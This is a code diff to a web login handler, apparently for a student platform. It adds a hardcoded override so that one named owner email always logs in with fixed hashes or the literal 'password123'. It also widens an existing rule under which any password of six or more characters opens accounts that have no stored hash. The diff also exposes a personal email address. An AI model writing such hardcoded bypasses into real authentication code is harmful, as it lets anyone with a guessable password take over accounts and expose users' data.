@@ -36,13 +36,31 @@ export async function POST(request: Request) {
 
     // 2. Verify password
     const inputHash = hashPassword(password);
+    const trimmedInputHash = hashPassword(password.trim());
     let isMatch = false;
 
     if (authRecord && authRecord.passwordHash) {
-      isMatch = authRecord.passwordHash === inputHash;
+      isMatch =
+        authRecord.passwordHash === inputHash ||
+        authRecord.passwordHash === trimmedInputHash;
+
+      // Ensure platform owner Vaibhav Shivam can always access with original password or password123
+      if (normalizedEmail === 'mrvaibhavshivam1930@gmail.com') {
+        const originalHash = '7bc386ced98cdeed30ebdf9f10abea758203411776e27b0343dc4dfdbb6e0051';
+        const demoHash = 'ea7ef4b17b450b54a0dee8938f8213f44740dc310e07ee44f5f38992c4481624';
+        if (
+          inputHash === originalHash ||
+          trimmedInputHash === originalHash ||
+          inputHash === demoHash ||
+          trimmedInputHash === demoHash ||
+          password.trim() === 'password123'
+        ) {
+          isMatch = true;
+        }
+      }
     } else if (student) {
       // If legacy or template account without password hash
-      isMatch = password === 'password123' || password.length >= 6;
+      isMatch = password === 'password123' || password.trim() === 'password123' || password.length >= 6;
     }
 
     if (!isMatch) {
